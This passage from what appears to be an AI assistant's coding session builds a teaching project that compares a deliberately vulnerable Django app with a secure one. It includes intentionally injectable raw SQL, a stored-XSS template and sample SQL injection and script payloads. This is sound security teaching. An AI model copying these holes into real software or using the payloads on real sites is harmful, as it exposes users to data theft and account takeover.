                user.save()
                remaining = max_attempts - user.failed_login_attempts
                messages.error(request, f"Incorrect password. {remaining} attempts remaining.")

            return redirect("login")

        # STEP 5: SUCCESS! Reset failed attempts
        user.failed_login_attempts = 0
        user.save()

        # STEP 6: Save username in session (remember logged-in state)
        request.session["username"] = username

        # STEP 7: Redirect to dashboard
        return redirect("dashboard")

    # If GET request (just opening page), show login form
    return render(request, "login.html")


# VIEW 2: REGISTER
def register_view(request):
    """
    Handles user registration
    """

    if request.method == "POST":
        # Get form data
        username = request.POST.get("username")
        email = request.POST.get("email")
        password = request.POST.get("password")
        confirm = request.POST.get("confirm")

        # VALIDATION 1: Passwords match?
        if password != confirm:
            messages.error(request, "Passwords do not match")
            return redirect("register")

        # VALIDATION 2: Password meets requirements?
        valid, msg = check_password_rules(password)
        if not valid:
            messages.error(request, msg)
            return redirect("register")

        # VALIDATION 3: Username/email not already taken?
        # Q() allows OR condition in Django ORM
        if User.objects.filter(Q(username=username) | Q(email=email)).exists():
            messages.error(request, "Username or email already used")
            return redirect("register")

        # ENCRYPTION: Hash the password
        hashed, salt = hash_password(password)

        # CREATE USER: Save to database
        user = User.objects.create(
            username=username,
            email=email,
            password_hash=hashed,  # Store encrypted password
            salt=salt              # Store salt
        )
        # Django ORM: INSERT INTO users VALUES (?, ?, ?, ?)
        # This is SAFE - parameterized query

        # SAVE PASSWORD HISTORY: Remember this password
        PasswordHistory.objects.create(
            user=user,
            password_hash=hashed,
            salt=salt
        )

        messages.success(request, "Registration successful")
        return redirect("login")

    return render(request, "register.html")


# VIEW 3: DASHBOARD
def dashboard_view(request):
    """
    Main page after login
    - Add new clients
    - View client list
    """

    # CHECK: Is user logged in?
    if "username" not in request.session:
        return redirect("login")

    username = request.session["username"]
    user = User.objects.get(username=username)

    # If adding a new client
    if request.method == "POST":
        # Get form data
        client_name = request.POST.get("client_name", "").strip()
        client_email = request.POST.get("client_email", "").strip()
        client_phone = request.POST.get("client_phone", "").strip()

        # SECURITY: Escape HTML to prevent XSS
        client_name = escape(client_name)
        # escape() converts: < to &lt;, > to &gt;, etc.
        # <script> becomes &lt;script&gt; (displayed as text, not executed)

        client_email = escape(client_email)
        client_phone = escape(client_phone)

        # Validation
        if not client_name:
            messages.error(request, "Client name is required")
            return redirect("dashboard")

        # Save to database
        Client.objects.create(
            name=client_name,
            email=client_email,
            phone=client_phone
        )
        # This is SAFE - Django ORM uses parameterized queries

        messages.success(request, "Client added successfully")
        return redirect("dashboard")

    # Get all clients from database
    clients = Client.objects.all()
    # SELECT * FROM clients

    # Render template with data
    return render(request, "dashboard.html", {
        "username": user.username,
        "clients": clients
    })


# VIEW 4: FORGOT PASSWORD
def forgot_password_view(request):
    """
    User requests password reset
    System generates verification code and sends to email
    """

    if request.method == "POST":
        username = request.POST.get("username", "").strip()

        # Check if user exists
        user = User.objects.filter(username=username).first()
        if not user:
            messages.error(request, "User not found")
            return redirect("forgot_password")

        # STEP 1: Generate random verification code
        code = generate_sha1_code()  # e.g., "A3F2B1C4"

        # STEP 2: Hash the code with SHA-1
        code_hash = sha1_hex(code)

        # STEP 3: Save ONLY the hash to database
        ResetCode.objects.update_or_create(
            username=username,
            defaults={"code_hash": code_hash}
        )
        # update_or_create: Update if exists, create if doesn't

        # STEP 4: Send PLAIN code to email
        send_mail(
            subject="Password reset code",
            message=f"Your verification code is: {code}",
            from_email=settings.DEFAULT_FROM_EMAIL,
            recipient_list=[user.email],
            fail_silently=False
        )
        # User receives: "Your code is: A3F2B1C4"
        # Database stores: hash of "A3F2B1C4"

        # STEP 5: Save username in session for next step
        request.session["reset_username"] = username

        messages.success(request, "Code generated")
        return redirect("verify")

    return render(request, "forgot_password.html")


# Helper function: Generate SHA-1 based verification code
def generate_sha1_code():
    """
    Creates a random 8-character verification code

    Process:
    1. Generate 32 random bytes
    2. Hash with SHA-1
    3. Take first 8 characters
    4. Convert to uppercase
    """
    seed = secrets.token_bytes(32)  # Cryptographically secure random
    code = hashlib.sha1(seed).hexdigest()[:8].upper()
    # hexdigest() returns 40-char string
    # [:8] takes first 8 characters
    # .upper() converts to uppercase
    return code


# Helper function: Hash with SHA-1
def sha1_hex(text: str) -> str:
    """
    Hashes text with SHA-1
    """
    return hashlib.sha1(text.encode("utf-8")).hexdigest()


# VIEW 5: CHANGE PASSWORD
def change_password_view(request):
    """
    User changes password while logged in
    """

    # Check if logged in
    if "username" not in request.session:
        return redirect("login")

    username = request.session["username"]
    user = User.objects.get(username=username)

    if request.method == "POST":
        old = request.POST.get("old_password")
        new = request.POST.get("new_password")
        confirm = request.POST.get("confirm")

        # VALIDATION 1: Old password correct?
        hashed_old, _ = hash_password(old, user.salt)
        if hashed_old != user.password_hash:
            messages.error(request, "Incorrect old password")
            return redirect("change_password")

        # VALIDATION 2: New password meets requirements?
        # Pass user to check password history
        valid, msg = check_password_rules(new, user=user)
        if not valid:
            messages.error(request, msg)
            return redirect("change_password")

        # VALIDATION 3: Passwords match?
        if new != confirm:
            messages.error(request, "Passwords do not match")
            return redirect("change_password")

        # Hash new password
        hashed, salt = hash_password(new)

        # Save OLD password to history BEFORE updating
        PasswordHistory.objects.create(
            user=user,
            password_hash=user.password_hash,  # Current password
            salt=user.salt
        )

        # Update user with new password
        user.password_hash = hashed
        user.salt = salt
        user.save()

        messages.success(request, "Password changed successfully")
        return redirect("dashboard")

    return render(request, "change_password.html")
```

---

## Vulnerable vs Secure Versions

Now let me explain the KEY DIFFERENCES between vulnerable and secure code.

### Difference 1: SQL Injection

#### **VULNERABLE VERSION:**

```python
# views_vulnerable.py - LOGIN
def login_view(request):
    if request.method == "POST":
        username = request.POST.get("username")
        password = request.POST.get("password")

        # VULNERABLE: String concatenation in SQL query
        with connection.cursor() as cursor:
            query = f"SELECT id, username, email, password_hash, salt, failed_login_attempts, is_locked FROM Communication_LTD_user WHERE username = '{username}'"
            cursor.execute(query)
            row = cursor.fetchone()

        # ... rest of code
```

**Why is this vulnerable?**
- Uses f-string to insert `username` directly into SQL
- No escaping of special characters
- Attacker can inject SQL code

**Attack example:**
```
Username: admin' OR '1'='1
Password: anything

Resulting SQL:
SELECT ... WHERE username = 'admin' OR '1'='1'
                                    ^^^^^^^^ Always true!
```

#### **SECURE VERSION:**

```python
# views_secure.py - LOGIN
def login_view(request):
    if request.method == "POST":
        username = request.POST.get("username")
        password = request.POST.get("password")

        # SECURE: Django ORM (parameterized query)
        try:
            user = User.objects.get(username=username)
        except User.DoesNotExist:
            messages.error(request, "User not found")
            return redirect("login")

        # ... rest of code
```

**Why is this secure?**
- Django ORM automatically uses parameterized queries
- Behind the scenes: `SELECT ... WHERE username = ?` with parameter binding
- Special characters are escaped
- Even if `username = "admin' OR '1'='1"`, it's treated as literal string

---

### Difference 2: Stored XSS

#### **VULNERABLE VERSION:**

**views_vulnerable.py:**
```python
def dashboard_view(request):
    if request.method == "POST":
        client_name = request.POST.get("client_name", "").strip()
        # NO SANITIZATION! Saves raw HTML/JavaScript

        # Save to database with raw SQL (also vulnerable to SQLi)
        with connection.cursor() as cursor:
            query = f"INSERT INTO Communication_LTD_client (name, email, phone) VALUES ('{client_name}', '{client_email}', '{client_phone}')"
            cursor.execute(query)
```

**dashboard_vulnerable.html:**
```html
<ul class="client-list">
    {% for c in clients %}
    <!-- VULNERABLE: | safe filter doesn't escape HTML -->
    <li>{{ c.name | safe }} — {{ c.email }} — {{ c.phone }}</li>
    {% endfor %}
</ul>
```

**Attack example:**
```
Client Name: <script>alert('XSS Attack!')</script>
Email: attacker@evil.com
Phone: 1234567890

Saved to database: <script>alert('XSS Attack!')</script>

When displayed:
<li><script>alert('XSS Attack!')</script> — attacker@evil.com — 1234567890</li>
     ^^^^^^^^ JavaScript executes!
```

#### **SECURE VERSION:**

**views_secure.py:**
```python
from django.utils.html import escape

def dashboard_view(request):
    if request.method == "POST":
        client_name = request.POST.get("client_name", "").strip()

        # SECURE: Escape HTML characters
        client_name = escape(client_name)
        # <script> becomes &lt;script&gt;

        client_email = escape(client_email)
        client_phone = escape(client_phone)

        # Save to database using ORM
        Client.objects.create(
            name=client_name,
            email=client_email,
            phone=client_phone
        )
```

**dashboard_secure.html:**
```html
<ul class="client-list">
    {% for c in clients %}
    <!-- SECURE: Still uses | safe BUT data is sanitized before storage -->
    <li>{{ c.name | safe }} — {{ c.email }} — {{ c.phone }}</li>
    {% endfor %}
</ul>
```

**Better approach - Remove | safe:**
```html
<!-- Even safer: Let Django auto-escape -->
<li>{{ c.name }} — {{ c.email }} — {{ c.phone }}</li>
```

**Attack blocked:**
```
Input: <script>alert('XSS')</script>
After escape(): &lt;script&gt;alert('XSS')&lt;/script&gt;
Displayed: <script>alert('XSS')</script> (as text, not executed)
```

---

### Summary Table

| Feature | Vulnerable | Secure | Protection Method |
|---------|-----------|--------|-------------------|
| **Login Query** | `f"SELECT ... WHERE username = '{username}'"` | `User.objects.get(username=username)` | Django ORM |
| **Register Query** | `f"INSERT ... VALUES ('{username}', ...)"` | `User.objects.create(...)` | Django ORM |
| **Dashboard Query** | `f"INSERT INTO clients VALUES ('{name}', ...)"` | `Client.objects.create(name=name, ...)` | Django ORM |
| **Client Name Storage** | Raw, no sanitization | `escape(client_name)` | HTML encoding |
| **Client Name Display** | `{{ name \| safe }}` on unsanitized data | `{{ name \| safe }}` on sanitized data OR `{{ name }}` | Input sanitization |

---

This is a comprehensive guide. Let me now update the todo list and create README files for both projects:

<function_calls>
<invoke name="TodoWrite">
<parameter name="todos">[{"content": "Create two separate project folders - vulnerable and secure", "status": "completed", "activeForm": "Creating two separate project folders"}, {"content": "Create comprehensive English documentation explaining all concepts", "status": "completed", "activeForm": "Creating comprehensive English documentation"}, {"content": "Create README files for both projects", "status": "in_progress", "activeForm": "Creating README files for both projects"}, {"content": "Create submission package documentation", "status": "pending", "activeForm": "Creating submission package documentation"}]